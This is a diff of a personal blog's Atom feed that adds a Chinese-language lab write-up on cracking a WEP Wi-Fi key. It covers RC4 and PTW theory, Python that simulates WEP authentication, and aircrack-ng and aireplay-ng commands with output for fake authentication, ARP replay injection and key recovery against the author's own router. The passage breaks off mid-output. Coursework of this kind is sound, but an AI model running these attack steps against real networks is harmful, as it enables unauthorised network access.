@@ -3,11 +3,11 @@
   <title>Mirage&#39;s Blog</title>
   <icon>https://www.gravatar.com/avatar/606a5ced851f56b2ba9cd725a4422625</icon>
   <subtitle>随心记录～</subtitle>
-  <link href="http://example.com/atom.xml" rel="self"/>
+  <link href="https://qilianshuo.github.io/atom.xml" rel="self"/>
   
-  <link href="http://example.com/"/>
-  <updated>2022-03-21T08:55:02.158Z</updated>
-  <id>http://example.com/</id>
+  <link href="https://qilianshuo.github.io/"/>
+  <updated>2022-04-25T10:47:52.593Z</updated>
+  <id>https://qilianshuo.github.io/</id>
   
   <author>
     <name>Mirage</name>
@@ -17,9 +17,59 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>WEP口令实验</title>
+    <link href="https://qilianshuo.github.io/2022/04/25/WEP%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C/"/>
+    <id>https://qilianshuo.github.io/2022/04/25/WEP%E5%8F%A3%E4%BB%A4%E5%AE%9E%E9%AA%8C/</id>
+    <published>2022-04-25T10:35:22.000Z</published>
+    <updated>2022-04-25T10:47:52.593Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="WEP-Wi-Fi口令攻击实验"><a href="#WEP-Wi-Fi口令攻击实验" class="headerlink" title="WEP Wi-Fi口令攻击实验"></a>WEP Wi-Fi口令攻击实验</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ul><li>了解WEP认证协议流程和其安全缺陷。</li><li>掌握协议攻击原理和流密码的应用。</li></ul><h2 id="实验环境配置"><a href="#实验环境配置" class="headerlink" title="实验环境配置"></a>实验环境配置</h2><h3 id="AP配置"><a href="#AP配置" class="headerlink" title="AP配置"></a>AP配置</h3><p>&emsp;&emsp;PHICOMM裴讯K2路由器，刷机华硕固件。AP加密模式为WEP- Open System，口令设置为<code>WEPAttackTest</code>。</p><p><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220425092421608.png" alt="image-20220425092421608"></p><h3 id="攻击环境"><a href="#攻击环境" class="headerlink" title="攻击环境"></a>攻击环境</h3><p>&emsp;&emsp;macOS Monterey主机 + Kali虚拟机 + USB外置网卡。</p><p><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/%E6%88%AA%E5%B1%8F2022-04-20%20%E4%B8%8B%E5%8D%888.27.26.png" alt="截屏2022-04-20 下午8.27.26"></p><p><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220423222229656.png" alt="image-20220423222229656"></p><h2 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h2><ol><li>通过arp欺骗获取口令（俗称密码）</li><li>编程实现WEP认证协议</li><li>解析口令获取的原理和过程</li><li>分析WAP认证协议如何抵抗该攻击方法</li></ol><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><blockquote><p>WEP协议的安全性依赖于RC4加密算法的安全性，同时IEEE802.11协议的一些安全问题使攻击更容易完成。</p></blockquote><h3 id="RC4加密分析"><a href="#RC4加密分析" class="headerlink" title="RC4加密分析"></a>RC4加密分析</h3><p>&emsp;&emsp;RC4的本质是流密码的异或加密，为了获取与明文等长的密钥流，使用了两个算法：<code>Key Scheduling Algorithm(RC4-KSA)</code>和<code>Pseudo Random Generator Algorithm(PRGA)</code>。</p><p>&emsp;&emsp;RC4使用一个长度为256的字节数组S，每次从中随机选择一位作为密钥流的一部分。可以看出密钥流的生成本质是随机数的生成，使用密钥作为初始种子，通过算法去不断迭代生成随机密钥流。</p><p>&emsp;&emsp;密钥调度算法KSA的处理过程如下：</p><script type="math/tex; mode=display">\begin{aligned}&for \quad i  = 0 \quad to \quad{n-1} \quad do\\&\quad S[i] = i\\&end\\&for \quad i = 0 \quad to \quad{n-1} \quad do\\&\quad j = RND(n)\\&\quad swap(S,i,j)\\&end\\\end{aligned}</script><p>&emsp;&emsp;伪随机数生成算法PRGA的处理过程如下：</p><script type="math/tex; mode=display">\begin{aligned}&i=0\\&j=0\\&loop\\&\quad i = i + 1 \mod n\\&\quad j = RND(n)\\&\quad swap(S,i,j)\\&\quad print \ S[S[i]+S[j] \mod n]\\&end \ loop\\\end{aligned}</script><p>&emsp;&emsp;PRGA可以是一个无限长的循环，循环次数取决于需要加密的数据长度，每循环一次生成一位密钥字节，最终得到与明文等长的密钥流，与明文逐个字节进行异或处理，就得到了密文。</p><h3 id="WEP认证分析"><a href="#WEP认证分析" class="headerlink" title="WEP认证分析"></a>WEP认证分析</h3><p>&emsp;&emsp;为了使密钥具有随机性，WEP引入了初始向量initialization vector（IV），把IV添加到密钥头生成新的密钥，这样每次用来生成密钥流的随机种子都会不同，以增强协议的安全性。<br><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/WEPEncrypt.drawio.svg" alt="image-20220423233311891"></p><ol><li>STA向AP发送Authentication Request认证请求。</li><li>AP生成一个随机字符串(challenge)，明文发送给STA。</li><li>STA使用密钥加密<code>challenge</code>，把密文发给AP。</li><li>AP使用正确密钥解密STA发来的密文，如果解密后的数据和<code>challenge</code>相同，返回认证成功响应，否则返回失败响应。</li></ol><h4 id="编程模拟WEP认证过程"><a href="#编程模拟WEP认证过程" class="headerlink" title="编程模拟WEP认证过程"></a>编程模拟WEP认证过程</h4><blockquote><p>使用<code>scapy</code>库可以完成网卡发包，完全仿真WEP认证过程。由于没有充足的时间，暂时使用socket实现STA和AP间通信。</p></blockquote><ul><li><code>RC4.py</code> — 完成RC4加密及解密</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RC4</span>:</span></span><br><span class="line">    n = <span class="number">256</span></span><br><span class="line">    __S = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    __T = []</span><br><span class="line">    __K = <span class="built_in">list</span>()</span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, key: <span class="built_in">str</span></span>):</span></span><br><span class="line">        self.__K = key.encode()</span><br><span class="line">        self.l = <span class="built_in">len</span>(self.__K)</span><br><span class="line"></span><br><span class="line">        self._KSA()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_KSA</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.n):</span><br><span class="line">            j = (j + self.__S[i] + self.__K[i % self.l]) % self.n</span><br><span class="line">            self.__S[i], self.__S[j] = self.__S[j], self.__S[i]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">PRGA</span>(<span class="params">self, length</span>) -&gt; <span class="literal">None</span>:</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        key_stream = []</span><br><span class="line">        self.__T = self.__S.copy()</span><br><span class="line">        <span class="keyword">while</span> length:</span><br><span class="line">            i = (i + <span class="number">1</span>) % self.n</span><br><span class="line">            j = (j + self.__T[i]) % self.n</span><br><span class="line">            self.__T[i], self.__T[j] = self.__T[j], self.__T[i]</span><br><span class="line">            k = (self.__T[i] + self.__T[j]) % self.n</span><br><span class="line">            key_stream.append(self.__T[k])</span><br><span class="line">            length -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> key_stream</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self, plaintext</span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        key_stream = self.PRGA(<span class="built_in">len</span>(plaintext))</span><br><span class="line">        plain_stream = plaintext.encode()</span><br><span class="line">        cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plaintext)):</span><br><span class="line">            cipher += <span class="built_in">hex</span>(plain_stream[i] ^ key_stream[i]).upper()[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">self, ciphertext: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">        cipher_byte = [<span class="built_in">int</span>(ciphertext[i:i + <span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext), <span class="number">2</span>)]</span><br><span class="line">        key_stream = self.PRGA(<span class="built_in">len</span>(cipher_byte))</span><br><span class="line">        plain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher_byte)):</span><br><span class="line">            plain += <span class="built_in">chr</span>(cipher_byte[i] ^ key_stream[i])</span><br><span class="line">        <span class="keyword">return</span> plain</span><br></pre></td></tr></table></figure><ul><li><code>STA.py</code> — 模拟认证终端</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> RC4 <span class="keyword">import</span> RC4</span><br><span class="line"></span><br><span class="line">client = socket.socket()</span><br><span class="line">client.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">6968</span>))</span><br><span class="line">rc4 = RC4(<span class="string">&#x27;Mirage&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 发起认证请求</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1. Send AuthenticationRequest&#x27;</span>)</span><br><span class="line">data = <span class="string">&quot;AuthenticationRequest&quot;</span></span><br><span class="line">client.send(<span class="built_in">bytes</span>(data, encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">data = client.recv(<span class="number">1024</span>)</span><br><span class="line">data = data.decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 发送加密后的字符串</span></span><br><span class="line"><span class="keyword">if</span> data.startswith(<span class="string">&#x27;AuthenticationChallenge&#x27;</span>):</span><br><span class="line">    challenge = data[<span class="number">23</span>:]</span><br><span class="line">    cipher = rc4.encrypt(challenge)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;2. Use RC4 to encrypt the challenge:&#x27;</span>, challenge)</span><br><span class="line">    client.send(cipher.encode())</span><br><span class="line">    data = client.recv(<span class="number">1024</span>)</span><br><span class="line">    data = data.decode()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;3.&#x27;</span>, data)</span><br></pre></td></tr></table></figure><ul><li><code>AP.py</code> — 模拟AP路由</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> RC4 <span class="keyword">import</span> RC4</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">random_generator</span>(<span class="params">length: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(random.sample(</span><br><span class="line">        [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">         <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>], length</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">rc4 = RC4(<span class="string">&#x27;Mirage&#x27;</span>)</span><br><span class="line"></span><br><span class="line">server = socket.socket()</span><br><span class="line">server.bind((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6968</span>))</span><br><span class="line">server.listen()</span><br><span class="line"></span><br><span class="line">tmp = <span class="built_in">dict</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    con, addr = server.accept()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = con.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = data.decode()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">&#x27;AuthenticationRequest&#x27;</span>:</span><br><span class="line">            challenge = random_generator(<span class="number">20</span>)</span><br><span class="line">            tmp[addr[<span class="number">0</span>]] = challenge</span><br><span class="line">            <span class="built_in">print</span>(addr[<span class="number">0</span>], challenge)</span><br><span class="line">            con.send((<span class="string">&#x27;AuthenticationChallenge&#x27;</span> + challenge).encode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(rc4.decrypt(data))</span><br><span class="line">            <span class="built_in">print</span>(tmp.get(addr[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">if</span> rc4.decrypt(data) == tmp.get(addr[<span class="number">0</span>]):</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(addr), <span class="string">&#x27;AuthenticationResponseSuccess&#x27;</span>)</span><br><span class="line">                con.send(<span class="string">&#x27;AuthenticationResponseSuccess&#x27;</span>.encode())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="built_in">str</span>(addr), <span class="string">&#x27;AuthenticationResponseFail&#x27;</span>)</span><br><span class="line">                con.send(<span class="string">&#x27;AuthenticationResponseFail&#x27;</span>.encode())</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="与RC4无关的攻击"><a href="#与RC4无关的攻击" class="headerlink" title="与RC4无关的攻击"></a>与RC4无关的攻击</h3><ul><li><p>认证攻击</p><p>攻击者通过捕获STA和AP之间交换的认证数据包，构造新的合法认证。<code>aireplay-ng</code>工具实现了该攻击，<code>-1</code>为该攻击模式。</p></li><li><p>数据包注入攻击</p><p>攻击者捕获WEP网络的数据包，一段时间后重放，分为普通注入和ARP注入。本次实验使用到大量ARP包，<code>aireplay-ng</code>工具的<code>-3</code>模式为ARP重放注入攻击。由于WEP协议没有重复IV过滤机制，导致只要抓到一个ARP请求，攻击者就可以大量复制该请求包并重放来抓取AP的ARP响应。</p></li></ul><h3 id="与RC4有关的攻击"><a href="#与RC4有关的攻击" class="headerlink" title="与RC4有关的攻击"></a>与RC4有关的攻击</h3><ul><li><p>FMS攻击、KoreK攻击</p><p>需要较多的计算资源，并未对WEP协议造成致命打击，不在此详细介绍。</p></li><li><p>Klein攻击</p><p>该攻击利用Jenkis关联，可以证明：$Prob(K[l] = S_l^{-1}(l - X[l-1] - j_l - S_l[l]) = q(2/n) + (1-q)((n-2)/n(n-1))$大约为$1.3676/n$，其中，$q=(1-1/n)^{n-2}$。</p><p>攻击形式为：</p><script type="math/tex; mode=display">F_{Klein}(K[0],K[1],\cdots,K[l-1],X[l-1]) = S_l^{-1}[l-X[l-1]] - j_l - S_l[l]</script></li><li><p>PTW攻击</p><p>PTW攻是WEP安全性的分水岭，在此之前的攻击要么因为需要大量数据包要么需要大量计算而具有较高的攻击门槛，而PTW攻击只需要使用几千到几万个ARP包并用少量的计算就能攻破密码。</p><p>该攻击的主要思想为由决定密钥单个字节改变决定$\sigma_i = \sum\limits_{m=0}^iRk[m]$。</p><ol><li><p>将Klein攻击扩展为2个密钥Byte的和。可以证明：$Prob(K[l]+K[l+1]=S_l^{-1}(l+1-X[l])-j_l-S_l[l]-S_l[l+1])$为$q_2((n-1)/n)^{n-2}(2/n)+(1-q_2((n-1)/n)^{n-2})((n-2)/n(n-1))$。其中，$q_2$为$((n-1)/n)^3$。</p><p>PTW2攻击形式为：</p><script type="math/tex; mode=display">F_{PTW2}(K[0],K[1],\cdots,K[l-1],X[l]) = S_l^{-1}[l+1-X[l]] - j_l - S_l[l] - S_l[l+1]</script></li><li><p>继续扩展为m个密钥Byte的和。可以证明：</p><script type="math/tex; mode=display">Prob(\sum_{a=l}^{l+m-1}K[a] = S_l^{-1}(l+m+1-X[l+m-2])-j_l-\sum_{a=l}^{l+m-1}S_l[a])</script><p>为$q_m((n-1)/n)^{n-2}(2/n)+(1-q_m((n-1)/n)^{n-2})((n-2)/n(n-1))$。其中，$q_m$为$(\frac {n-1}{n})^{m-1}(\frac{n-m+1}{n})\mathop{\Pi}\limits_{a=1}^{m-1}(\frac{n-a}{n})$。</p><p>PTW攻击形式为：</p><script type="math/tex; mode=display">F_{PTWm}(K[0],K[1],\cdots,K[l-1],X[l+m-2]) = S_l^{-1}[l+m-1-X[l+m-2]] - j_l - \sum\limits_{a=l}^{l+m-1}S_l[a]</script></li></ol></li></ul><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="确认目标"><a href="#确认目标" class="headerlink" title="确认目标"></a>确认目标</h3><ol><li><p>在MacOS上使用<code>airport</code>工具扫描附近AP，确认攻击目标所在信道。扫描命令为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airport -s</span><br></pre></td></tr></table></figure><p><img src="https://picgo-mirage.oss-cn-hangzhou.aliyuncs.com/image/image-20220422200002182.png" alt="image-20220422200002182"></p><blockquote><p>或在Kali中使用<code>airodump-ng</code>工具扫描，确认目标信道及MAC后再锁定网卡信道。</p></blockquote></li><li><p>在kali虚拟机中将网卡开启监听模式，同时锁定目标信道。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0 13</span><br></pre></td></tr></table></figure><p>使用<code>iwconfig</code>命令确认网卡是否开启monitor模式。</p></li><li><p>测试注入可行性</p><blockquote><p><strong>-9</strong> 注入测试模式<br><strong>-e</strong> 目标ESSID<br><strong>-a</strong> 目标MAC</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# aireplay-ng -9 -e Mirage -a 74:7D:24:AC:83:C0 wlan0mon</span><br><span class="line">09:35:07  Waiting for beacon frame (BSSID: 74:7D:24:AC:83:C0) on channel 13</span><br><span class="line">09:35:07  Trying broadcast probe requests...</span><br><span class="line">09:35:07  Injection is working!</span><br><span class="line">09:35:09  Found 1 AP </span><br><span class="line"></span><br><span class="line">09:35:09  Trying directed probe requests...</span><br><span class="line">09:35:09  74:7D:24:AC:83:C0 - channel: 13 - &#x27;Mirage&#x27;</span><br><span class="line">09:35:09  Ping (min/avg/max): 1.546ms/11.259ms/36.031ms Power: -42.69</span><br><span class="line">09:35:09  29/30:  96%</span><br></pre></td></tr></table></figure></li></ol><h3 id="监听目标"><a href="#监听目标" class="headerlink" title="监听目标"></a>监听目标</h3><ol><li><p>使用<code>airodump-ng</code>抓包</p><blockquote><p><strong>-c</strong> 指定监听信道</p><p><strong>—bssid</strong> 指定监听目标MAC</p><p><strong>-w</strong> 保存的抓包数据文件名</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# airodump-ng -c 13 --bssid 74:7D:24:AC:83:C0 -w crackPKT wlan0mon</span><br><span class="line">09:57:34  Created capture file &quot;crackPKT-01.cap&quot;.</span><br><span class="line"></span><br><span class="line">CH 13 ][ Elapsed: 4 mins ][ 2022-04-23 10:01 ][ Are you sure you want to quit? Press Q agai </span><br><span class="line">                                                                                             </span><br><span class="line">BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID         </span><br><span class="line">                                                                                             </span><br><span class="line">74:7D:24:AC:83:C0  -65   0     1621    35813   54  13   54e. WEP  WEP    OPN  Mirage        </span><br><span class="line">                                                                                             </span><br><span class="line">BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes           </span><br><span class="line">                                                                                             </span><br><span class="line">74:7D:24:AC:83:C0  D0:5A:FD:F0:4E:09  -18    1e- 1e     0    36064               74:7D:24:AC:83:C0  70:F1:1C:3D:6E:41  -60    6 - 1   3942   138117 </span><br></pre></td></tr></table></figure></li></ol><h3 id="重放注入攻击"><a href="#重放注入攻击" class="headerlink" title="重放注入攻击"></a>重放注入攻击</h3><ol><li><p>使用<code>aireplay-ng</code>建立一个虚假认证。</p><blockquote><p><strong>-1</strong> 虚假认证攻击<br><strong>6000</strong> 每隔6000秒重新发起一次认证<br><strong>-o 1</strong> 每次认证只发送一个包， 默认发送多个<br><strong>-q 10 </strong> 每隔10秒发送一次<code>keep-alive</code>请求</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# aireplay-ng -1 6000 -o 1 -q 10 -e Mirage -a 74:7D:24:AC:83:C0 -h 70:f1:1c:3d:6e:41 wlan0mon</span><br><span class="line">09:58:04  Waiting for beacon frame (BSSID: 74:7D:24:AC:83:C0) on channel 13</span><br><span class="line"></span><br><span class="line">09:58:04  Sending Authentication Request (Open System) [ACK]</span><br><span class="line">09:58:04  Authentication successful</span><br><span class="line">09:58:04  Sending Association Request</span><br><span class="line">09:58:04  Association successful :-) (AID: 1)</span><br><span class="line"></span><br><span class="line">09:58:14  Sending keep-alive packet [ACK]    </span><br><span class="line">09:58:24  Sending keep-alive packet [ACK]</span><br></pre></td></tr></table></figure></li><li><p>开始ARP重放攻击，制造大量ARP请求</p></li><li><blockquote><p><strong>-3</strong> ARP注入攻击模式</p><p><strong>-b</strong> 目标MAC</p><p><strong>-h</strong> 本机MAC</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# aireplay-ng -3 -b 74:7D:24:AC:83:C0 -h 70:f1:1c:3d:6e:41 wlan0mon </span><br><span class="line">09:58:29  Waiting for beacon frame (BSSID: 74:7D:24:AC:83:C0) on channel 13</span><br><span class="line">Saving ARP requests in replay_arp-0423-095829.cap</span><br><span class="line">You should also start airodump-ng to capture replies.</span><br><span class="line">Read 194286 packets (got 73132 ARP requests and 42780 ACKs), sent 73276 packets...(499 pps)</span><br></pre></td></tr></table></figure></li></ol><h3 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h3><ol><li><p>使用<code>aircrack-ng</code>解密捕获的数据包（默认使用PTW攻击破解，如需FMS/KoreK攻击使用<code>-K</code>参数）</p><blockquote><p><strong>—bssid</strong> 需要解密的AP的BSSID</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# aircrack-ng --bssid 74:7D:24:AC:83:C0 crackPKT*.cap                                               </span><br><span class="line">Reading packets, please wait...</span><br><span class="line">Opening crackPKT-01.cap</span><br><span class="line">Read 257915 packets.</span><br><span class="line"></span><br><span class="line">1 potential targets                  Got 35812 out of 35000 IVsStarting PTW attack with 35812 ivs.</span><br><span class="line"></span><br><span class="line">Attack will be restarted every 5000 captured ivs.</span><br><span class="line"></span><br><span class="line">                                          Aircrack-ng 1.6 </span><br><span class="line">                            [00:00:00] TesAircrack-ng 1.6  (got 30170 IVs)</span><br><span class="line">                            [00:00:00] Tested 1632001 keys (got 30170 IVs)</span><br><span class="line">   KB    depth   byte(vote) [00:00:00] Tested 1785601 keys (got 30170 IVs)</span><br><span class="line">   KB    depth   byte(vote)D[00:00:01] Tested 314088 keys (got 35812 IVs)</span><br><span class="line">   KB    depth   byte(vote)DD(37376) 2B(37120) 